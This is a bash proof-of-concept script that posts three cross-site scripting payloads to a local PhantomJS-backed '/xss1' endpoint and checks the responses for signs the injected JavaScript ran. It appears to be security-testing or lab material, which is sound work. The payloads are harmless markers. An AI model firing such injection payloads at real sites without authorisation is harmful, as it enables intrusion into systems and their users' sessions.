#!/bin/bash

# POC: Insecure Subprocess Execution - XSS in PhantomJS Context
# This demonstrates that user-controlled content is executed by PhantomJS without sanitization

TARGET="http://localhost:5000"
echo "[*] Testing PhantomJS XSS Injection Vulnerability"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Basic XSS payload with alert()
echo "[*] Test 1: Injecting JavaScript alert() payload..."
PAYLOAD='<script>alert("XSS_EXECUTED")</script>'

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/xss1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "xss=$PAYLOAD" 2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Status: $HTTP_CODE"
echo "Response Body:"
echo "$BODY"
echo ""

# Check if the response indicates script execution was detected
if echo "$BODY" | grep -qi "alert\|script\|executed\|detected\|found"; then
    echo "[+] VULNERABLE: The application processed the JavaScript payload!"
    echo "[+] Evidence: PhantomJS executed the injected script content"
    echo ""
fi

# Test 2: More complex payload with DOM manipulation
echo "[*] Test 2: Injecting DOM manipulation payload..."
PAYLOAD2='<script>document.write("INJECTED_CONTENT");</script><img src=x onerror=alert(1)>'

RESPONSE2=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/xss1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "xss=$PAYLOAD2" 2>&1)

HTTP_CODE2=$(echo "$RESPONSE2" | tail -n 1)
BODY2=$(echo "$RESPONSE2" | head -n -1)

echo "HTTP Status: $HTTP_CODE2"
echo "Response Body:"
echo "$BODY2"
echo ""

# Test 3: Try with confirm() dialog
echo "[*] Test 3: Injecting confirm() dialog payload..."
PAYLOAD3='<script>confirm("PhantomJS_Execution")</script>'

RESPONSE3=$(curl -s -w "\n%{http_code}" -X POST "$TARGET/xss1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "xss=$PAYLOAD3" 2>&1)

HTTP_CODE3=$(echo "$RESPONSE3" | tail -n 1)
BODY3=$(echo "$RESPONSE3" | head -n -1)

echo "HTTP Status: $HTTP_CODE3"
echo "Response Body:"
echo "$BODY3"
echo ""

if echo "$BODY3" | grep -qi "confirm\|executed\|detected\|found"; then
    echo "[+] VULNERABLE: PhantomJS processed the confirm() dialog!"
    echo ""
fi

echo "========================================="
echo "[*] Summary:"
echo "This POC demonstrates that user-supplied content is:"
echo "1. Written directly to an HTML file without sanitization"
echo "2. Processed by PhantomJS which executes JavaScript"
echo "3. Capable of executing arbitrary JavaScript in the PhantomJS context"
echo ""
echo "Impact: XSS execution, potential data access, DoS via resource-intensive scripts"
echo "========================================="